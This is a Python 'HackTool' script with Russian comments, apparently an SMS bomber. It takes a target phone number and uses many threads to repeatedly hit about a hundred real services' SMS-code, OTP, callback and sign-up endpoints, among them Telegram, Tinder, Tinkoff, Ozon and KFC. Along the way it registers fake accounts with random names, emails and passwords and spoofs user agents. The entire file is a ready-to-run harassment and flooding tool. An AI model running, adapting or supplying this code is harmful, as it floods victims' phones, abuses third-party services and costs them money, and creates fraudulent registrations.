import requests
import fake_useragent
import pyfiglet
from termcolor import colored
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# ASCII-арт приветствия
ascii_banner = pyfiglet.figlet_format("HackTool")
colored_banner = colored(ascii_banner, color='magenta')  # Красим в цвет
print(colored_banner)
print(colored("⚡ REBEL EDITION - MAXIMUM OVERDRIVE ⚡", 'yellow', attrs=['bold']))
print(colored("▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰", 'cyan'))


def generate_random_data():
    """Генерирует случайные данные для запросов"""
    names = ['Alex', 'Max', 'Dmitry', 'Sergey', 'Andrey', 'Michael', 'David', 'John']
    emails = ['gmail.com', 'yahoo.com', 'mail.ru', 'yandex.ru', 'hotmail.com']
    name = random.choice(names)
    email = f"{name.lower()}{random.randint(1, 999)}@{random.choice(emails)}"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    return name, email, password


def format_phone(phone):
    """Форматирует номер телефона для разных API"""
    # Убираем все нецифровые символы
    digits = ''.join(filter(str.isdigit, phone))
    if len(digits) == 10:
        return f"+7{digits}"
    elif len(digits) == 11 and digits.startswith('7'):
        return f"+{digits}"
    elif len(digits) == 11 and digits.startswith('8'):
        return f"+7{digits[1:]}"
    else:
        return f"+7{digits[-10:]}" if len(digits) >= 10 else phone


def send_request(url, method='POST', headers=None, data=None, json=None, params=None):
    """Универсальная функция отправки запросов с обработкой ошибок"""
    try:
        if headers is None:
            headers = {'User-Agent': fake_useragent.UserAgent().random}
        
        if method.upper() == 'POST':
            if json:
                response = requests.post(url, headers=headers, json=json, timeout=5)
            else:
                response = requests.post(url, headers=headers, data=data, params=params, timeout=5)
        else:  # GET
            response = requests.get(url, headers=headers, params=params, timeout=5)
        
        if response.status_code < 400:
            return True, f"✅ {response.status_code}"
        else:
            return False, f"❌ {response.status_code}"
    except Exception as e:
        return False, f"💥 {str(e)[:30]}"


def send_requests(phone_number, repeat_count=5, threads=10):
    """
    Отправляет POST-запросы на указанные URL с заданным количеством повторений.
    :param phone_number: Номер телефона для отправки.
    :param repeat_count: Количество повторений отправки запросов.
    :param threads: Количество потоков для параллельной отправки.
    """
    phone = format_phone(phone_number)
    phone9 = phone[-10:] if len(phone) >= 10 else phone
    name, email, password = generate_random_data()
    
    print(colored(f"\n🎯 Цель: {phone}", 'white', attrs=['bold']))
    print(colored(f"📧 Email: {email}", 'white'))
    print(colored(f"🔑 Пароль: {password}", 'white'))
    print(colored(f"🔄 Повторений: {repeat_count}", 'white'))
    print(colored(f"🧵 Потоков: {threads}\n", 'white'))

    # Основной список URL и параметров
    all_requests = [
        # Telegram и связанные сервисы
        ('https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin', 
         {'phone': phone}),
        ('https://translations.telegram.org/auth/request', 
         {'phone': phone}),
        ('https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F', 
         {'phone': phone}),
        ('https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin', 
         {'phone': phone}),
        ('https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', 
         {'phone': phone}),
        ('https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', 
         {'phone': phone}),
        ('https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23', 
         {'phone': phone}),
        ('https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin', 
         {'phone': phone}),
        ('https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F', 
         {'phone': phone}),
        ('https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin', 
         {'phone': phone}),
        ('https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch', 
         {'phone': phone}),
        ('https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin', 
         {'phone': phone}),
        ('https://my.telegram.org/auth/send_password', 
         {'phone': phone}),
        
        # MVideo
        ('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
         {'phone': phone, 'recaptcha': 'off', 'g-recaptcha-response': ''},
         {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json', 'Content-Type': 'application/x-www-form-urlencoded',
          'Origin': 'https://www.mvideo.ru', 'Referer': 'https://www.mvideo.ru/'}),
        
        # RuTaxi
        ('https://moscow.rutaxi.ru/ajax_keycode.html',
         {'l': phone9}),
        
        # BelkaCar
        ('https://belkacar.ru/get-confirmation-code',
         {'phone': phone}),
        
        # StarPizza
        ('https://starpizzacafe.com/mods/a.function.php',
         {'aj': '50', 'registration-phone': phone}),
        
        # Tinder
        ('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
         {'phone_number': phone},
         {'User-Agent': 'Tinder/7.5.0 (iPhone; iOS 10.2; Scale/2.00)'}),
        
        # Karusel
        ('https://app.karusel.ru/api/v1/phone/',
         {'phone': phone}),
        
        # Tinkoff
        ('https://api.tinkoff.ru/v1/sign_up',
         {'phone': '+' + phone}),
        
        # Dostavista
        ('https://dostavista.ru/backend/send-verification-sms',
         {'phone': phone}),
        
        # Monobank
        ('https://www.monobank.com.ua/api/mobapplink/send',
         {'phone': '+' + phone}),
        
        # Binotel
        ('https://widgets.binotel.com/getcall/call/',
         {'status': 'success', 'GetCallID': random.randint(1000000, 9999999)}),
        
        # Sportmaster
        ('https://www.sportmaster.ua/',
         {'module': 'users', 'action': 'SendSMSReg', 'phone': phone},
         None, 'GET'),
        
        # Alfa Life
        ('https://alfalife.cc/auth.php',
         {'phone': phone}),
        
        # KoronaPay
        ('https://koronapay.com/transfers/online/api/users/otps',
         None, None, 'POST', {'phone': phone}),
        
        # Silpo
        ('https://silpo.ua/graphql',
         {'validateLoginInput': {'flowId': random.randint(10000, 99999), 
                                 'currentPlace': phone, 
                                 'nextStep': 'auth-otp', 
                                 '__typename': 'FlowResponse'}},
         {'Content-Type': 'application/json'}, 'POST', None, True),
        
        # BTFair
        ('https://btfair.site/api/user/phone/code',
         None, None, 'POST', {'phone': '+' + phone}),
        
        # GGBet
        ('https://ggbet.ru/api/auth/register-with-phone',
         {'phone': '+' + phone, 'login': email, 'password': password, 
          'agreement': 'on', 'oferta': 'on'}),
        
        # ETM
        ('https://www.etm.ru/cat/runprog.html',
         {'m_phone': phone, 'mode': 'sendSms', 'syf_prog': 'clients-services', 'getSysParam': 'yes'}),
        
        # TheHive
        ('https://thehive.pro/auth/signup',
         None, None, 'POST', {'phone': '+' + phone}),
        
        # MTS TV
        ('https://api.mtstv.ru/v1/users',
         None, None, 'POST', {'msisdn': phone}),
        
        # My.Games
        ('https://account.my.games/signup_send_sms/',
         {'phone': phone}),
        
        # Zoloto585
        ('https://zoloto585.ru/api/bcard/reg/',
         None, None, 'POST', 
         {'name': name, 'surname': name, 'patronymic': name, 'sex': 'm',
          'birthdate': f"{random.randint(1,28)}.{random.randint(1,12)}.{random.randint(1970,2000)}",
          'phone': phone, 'email': email, 'city': ' '}),
        
        # Kasta
        ('https://kasta.ua/api/v2/login/',
         {'phone': phone}),
        
        # Taxi Ritm
        ('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
         {'RECALL': 'Y', 'BACK_CALL_PHONE': phone}),
        
        # Mail.ru Cloud
        ('https://cloud.mail.ru/api/v2/notify/applink',
         None, None, 'POST', {'phone': '+' + phone, 'api': 2, 
                               'email': 'email', 'x-email': 'x-email'}),
        
        # Creditter
        ('https://api.creditter.ru/confirm/sms/send',
         None, None, 'POST', {'phone': phone, 'type': 'register'}),
        
        # Ingos
        ('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
         None, 
         {'Referer': 'https://www.ingos.ru/cabinet/registration/personal'}, 
         'POST', 
         {'Birthday': f"{random.randint(1970,2000)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}T07:19:56.276+02:00",
          'DocIssueDate': f"{random.randint(2000,2015)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}T07:19:56.276+02:00",
          'DocNumber': random.randint(500000, 999999), 
          'DocSeries': random.randint(5000, 9999),
          'FirstName': name, 'Gender': 'M', 'LastName': name, 'SecondName': name,
          'Phone': phone, 'Email': email}),
        
        # 1Admiral
        ('https://win.1admiralxxx.ru/api/en/register.json',
         None, None, 'POST', 
         {'mobile': phone, 'bonus': 'signup', 'agreement': 1, 
          'currency': 'RUB', 'submit': 1, 'email': '', 'lang': 'en'}),
        
        # AV.ru
        ('https://oauth.av.ru/check-phone',
         None, None, 'POST', {'phone': phone}),
        
        # MTS TV (public)
        ('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
         None, None, 'POST', None, False, {'msisdn': phone}),
        
        # City24
        ('https://city24.ua/personalaccount/account/registration',
         {'PhoneNumber': phone}),
        
        # Sushi Master
        ('https://client-api.sushi-master.ru/api/v1/auth/init',
         None, None, 'POST', {'phone': phone}),
        
        # Multiplex
        ('https://auth.multiplex.ua/login',
         None, None, 'POST', {'login': phone}),
        
        # 3040.com.ua
        ('https://3040.com.ua/taxi-ordering',
         {'callback-phone': phone}),
        
        # Niyama
        ('https://www.niyama.ru/ajax/sendSMS.php',
         {'REGISTER[PERSONAL_PHONE]': phone, 'code': '', 'sendsms': ' '}),
        
        # VSK
        ('https://shop.vsk.ru/ajax/auth/postSms/',
         {'phone': phone}),
        
        # EasyPay
        ('https://api.easypay.ua/api/auth/register',
         None, None, 'POST', {'phone': phone, 'password': password}),
        
        # Fix Price
        ('https://fix-price.ru/ajax/register_phone_code.php',
         {'register_call': 'Y', 'action': 'getCode', 'phone': '+' + phone}),
        
        # NL.ua
        ('https://www.nl.ua',
         {'component': 'bxmaker.authuserphone.login',
          'sessid': ''.join(random.choices(string.hexdigits, k=32)),
          'method': 'sendCode', 'phone': phone, 'registration': 'N'}),
        
        # Tele2
        ('https://msk.tele2.ru/api/validation/number/' + phone,
         None, None, 'POST', {'sender': 'Tele2'}),
        
        # Finam
        ('https://www.finam.ru/api/smslocker/sendcode',
         None, None, 'GET', None, False, {'phone': '+' + phone}),
        
        # Makimaki
        ('https://makimaki.ru/system/callback.php',
         {'cb_fio': name, 'cb_phone': phone}),
        
        # Flipkart
        ('https://www.flipkart.com/api/6/user/signup/status',
         None, 
         {'Origin': 'https://www.flipkart.com', 
          'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop'}, 
         'POST', 
         {'loginId': '+' + phone, 'supportAllStates': True}),
        
        # Online.ua
        ('https://secure.online.ua/ajax/check_phone/',
         None, None, 'POST', None, False, {'reg_phone': phone}),
        
        # Planetakino
        ('https://cabinet.planetakino.ua/service/sms',
         None, None, 'POST', None, False, {'phone': phone}),
        
        # Ontaxi
        ('https://ontaxi.com.ua/api/v2/web/client',
         None, None, 'POST', {'country': 'UA', 'phone': phone}),
        
        # IQOS
        ('https://ube.pmsm.org.ru/esb/iqos-phone/validate',
         None, None, 'POST', {'phone': phone}),
        
        # Smart Space
        ('https://smart.space/api/users/request_confirmation_code/',
         None, None, 'POST', {'mobile': '+' + phone, 'action': 'confirm_mobile'}),
        
        # KFC
        ('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
         None, None, 'POST', {'phone': '+' + phone}),
        
        # Tarantino Family
        ('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
         {'action': 'ajax_register_user', 'step': '1', 
          'security_login': ''.join(random.choices(string.hexdigits, k=10)), 
          'phone': phone}),
        
        # Apteka.ru
        ('https://apteka.ru/_action/auth/getForm/',
         {'form[NAME]': '', 'form[PERSONAL_GENDER]': '', 
          'form[PERSONAL_BIRTHDAY]': '', 'form[EMAIL]': '',
          'form[LOGIN]': phone, 'form[PASSWORD]': password,
          'get-new-password': ' SMS', 'user_agreement': 'on',
          'personal_data_agreement': 'on', 'formType': 'simple', 
          'utc_offset': '120'}),
        
        # Uklon
        ('https://uklon.com.ua/api/v1/account/code/send',
         None, 
         {'client_id': ''.join(random.choices(string.hexdigits, k=32))}, 
         'POST', 
         {'phone': phone}),
        
        # Ozon
        ('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
         None, None, 'POST', {'phone': phone, 'otpId': 0}),
        
        # Banki.ru
        ('https://requests.service.banki.ru/form/960/submit',
         None, None, 'GET', None, False, 
         {'callback': 'submitCallback', 'name': name, 'phone': '+' + phone,
          'email': email, 'gorod': ' ', 'approving_data': '1'}),
        
        # Ivi
        ('https://api.ivi.ru/mobileapi/user/register/phone/v6',
         {'phone': phone}),
        
        # Moyo
        ('https://www.moyo.ua/identity/registration',
         {'firstname': name, 'phone': phone, 'email': email}),
        
        # Helsi
        ('https://helsi.me/api/healthy/accounts/login',
         None, None, 'POST', {'phone': phone, 'platform': 'PISWeb'}),
        
        # Kinoland
        ('https://api.kinoland.com.ua/api/v1/service/send-sms',
         None, {'Agent': 'website'}, 'POST', {'Phone': phone, 'Type': 1}),
        
        # Pizza Hut
        ('https://pizzahut.ru/account/password-reset',
         {'reset_by': 'phone', 'action_id': 'pass-recovery', 
          'phone': phone, '_token': '*'}),
        
        # Rabota.ru
        ('https://www.rabota.ru/remind',
         {'credential': phone}),
        
        # Rutube
        ('https://rutube.ru/api/accounts/sendpass/phone',
         {'phone': '+' + phone}),
        
        # Citilink
        (f'https://www.citilink.ru/registration/confirm/phone/{phone}/',
         None, None, 'POST'),
        
        # SMS Int
        ('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
         {'name': name, 'phone': phone, 'promo': 'yellowforma'}),
        
        # OYO Rooms
        (f'https://www.oyorooms.com/api/pwa/generateotp?phone={phone9}&country_code=%2B7&nod=4&locale=en',
         None, None, 'GET'),
        
        # Newnext
        ('https://newnext.ru/graphql',
         None, None, 'POST', 
         {'operationName': 'registration', 
          'variables': {'client': {'firstName': ' ', 'lastName': ' ', 
                                   'phone': phone, 'typeKeys': ['Unemployed']}},
          'query': 'mutation registration($client: ClientInput!) { registration(client: $client) { token __typename } }'}),
        
        # Sunlight
        ('https://api.sunlight.net/v3/customers/authorization/',
         {'phone': phone}),
        
        # Alpari
        ('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
         None, None, 'POST', 
         {'client_type': 'personal', 'email': email, 'mobile_phone': phone, 'deliveryOption': 'sms'}),
        
        # Invitro
        ('https://lk.invitro.ru/lk2/lka/patient/refreshCode',
         {'phone': phone}),
        
        # Sbis
        ('https://online.sbis.ru/reg/service/',
         None, None, 'POST', 
         {'jsonrpc': '2.0', 'protocol': '5', 'method': ' . ', 
          'params': {'phone': phone}, 'id': '1'}),
        
        # PS Bank
        ('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
         None, None, 'POST', 
         {'firstName': ' ', 'middleName': ' ', 'lastName': ' ', 'sex': '1',
          'birthDate': '10.10.2000', 'mobilePhone': phone9,
          'russianFederationResident': 'true', 'isDSA': 'false',
          'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null',
          'promotionAgreement': 'true'}),
        
        # Beltelecom
        ('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru',
         {'phone': phone}),
        
        # Chef Yandex
        ('https://api.chef.yandex/api/v2/auth/sms',
         None, None, 'POST', {'phone': phone}),
        
        # Delitime
        ('https://api.delitime.ru/api/v2/signup',
         {'SignupForm[username]': phone, 'SignupForm[device_type]': 3}),
        
        # Findclone
        ('https://findclone.ru/register',
         None, None, 'GET', None, False, {'phone': '+' + phone}),
        
        # Guru Taxi
        ('https://guru.taxi/api/v1/driver/session/verify',
         None, None, 'POST', {'phone': {'code': 1, 'number': phone}}),
        
        # ICQ
        ('https://www.icq.com/smsreg/requestPhoneValidation.php',
         {'msisdn': phone, 'locale': 'en', 'countryCode': 'ru',
          'version': '1', 'k': 'ic1rtwz1s1Hj1O0r', 'r': str(random.randint(10000, 99999))}),
        
        # InDriver
        ('https://terra-1.indriverapp.com/api/authorization?locale=ru',
         {'mode': 'request', 'phone': '+' + phone, 'phone_permission': 'unknown',
          'stream_id': 0, 'v': 3, 'appversion': '3.20.6',
          'osversion': 'unknown', 'devicemodel': 'unknown'}),
        
        # OK.ru
        ('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone',
         {'st.r.phone': '+' + phone}),
        
        # Qlean
        ('https://qlean.ru/clients-api/v2/sms_codes/auth/request_code',
         None, None, 'POST', {'phone': phone}),
        
        # SMS Gorod
        ('http://smsgorod.ru/sendsms.php',
         {'number': phone}),
        
        # Twitch
        ('https://passport.twitch.tv/register?trusted_request=true',
         None, None, 'POST', 
         {'birthday': {'day': 11, 'month': 11, 'year': 1999},
          'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp',
          'include_verification_code': True, 'password': password,
          'phone_number': phone, 'username': name + str(random.randint(1, 999))}),
        
        # WiFi.ru
        ('https://cabinet.wi-fi.ru/api/auth/by-sms',
         {'msisdn': phone}, {'App-ID': 'cabinet'}),
        
        # Wowworks
        ('https://api.wowworks.ru/v2/site/send-code',
         None, None, 'POST', {'phone': phone, 'type': 2}),
        
        # Yandex Eda
        ('https://eda.yandex/api/v1/user/request_authentication_code',
         None, None, 'POST', {'phone_number': '+' + phone}),
        
        # Youla
        ('https://youla.ru/web-api/auth/request_code',
         {'phone': phone}),
        
        # Anytime
        ('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode',
         {'phone': phone}),
        
        # Delivery Club
        ('https://www.delivery-club.ru/ajax/user_otp',
         {'phone': phone}),
    ]

    total_requests = len(all_requests)
    success_count = 0
    fail_count = 0
    
    for cycle in range(repeat_count):
        print(colored(f"\n{'='*60}", 'yellow'))
        print(colored(f"🔥 ЦИКЛ {cycle + 1}/{repeat_count} 🔥", 'yellow', attrs=['bold']))
        print(colored(f"{'='*60}", 'yellow'))
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_request = {}
            
            for i, req_data in enumerate(all_requests):
                if len(req_data) >= 2:
                    url = req_data[0]
                    data = req_data[1] if len(req_data) > 1 else None
                    headers = req_data[2] if len(req_data) > 2 else None
                    method = req_data[3] if len(req_data) > 3 else 'POST'
                    json_data = req_data[4] if len(req_data) > 4 else None
                    use_json = req_data[5] if len(req_data) > 5 else False
                    params = req_data[6] if len(req_data) > 6 else None
                    
                    if use_json and json_data is None:
                        json_data = data
                        data = None
                    
                    future = executor.submit(
                        send_request, url, method, headers, data, json_data, params
                    )
                    future_to_request[future] = (url, i)
            
            for future in as_completed(future_to_request):
                url, idx = future_to_request[future]
                success, status = future.result()
                
                if success:
                    success_count += 1
                    print(colored(f"✓ [{idx+1:03d}] {status} - {url[:50]}...", 'green'))
                else:
                    fail_count += 1
                    print(colored(f"✗ [{idx+1:03d}] {status} - {url[:50]}...", 'red'))
        
        # Прогресс-бар
        progress = (success_count / (total_requests * (cycle + 1))) * 100 if total_requests > 0 else 0
        bar_length = 40
        filled = int(bar_length * progress // 100)
        bar = '█' * filled + '░' * (bar_length - filled)
        
        print(colored(f"\n📊 ПРОГРЕСС: |{bar}| {progress:.1f}%", 'cyan'))
        print(colored(f"✅ Успешно: {success_count}", 'green'))
        print(colored(f"❌ Ошибок: {fail_count}", 'red'))
        
        if cycle < repeat_count - 1:
            time.sleep(2)  # Пауза между циклами
    
    print(colored(f"\n{'='*60}", 'magenta'))
    print(colored(f"🏁 ЗАВЕРШЕНО! ИТОГО: {success_count} успешно, {fail_count} ошибок", 'magenta', attrs=['bold']))
    print(colored(f"{'='*60}", 'magenta'))


if __name__ == "__main__":
    print(colored("▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰", 'cyan'))
    phone_number = input(colored("📱 Введите номер телефона: ", 'yellow'))
    
    try:
        repeat = int(input(colored("🔄 Количество циклов (по умолчанию 5): ", 'yellow')) or "5")
    except:
        repeat = 5
    
    try:
        threads = int(input(colored("🧵 Количество потоков (по умолчанию 10): ", 'yellow')) or "10")
    except:
        threads = 10
    
    send_requests(phone_number, repeat, threads)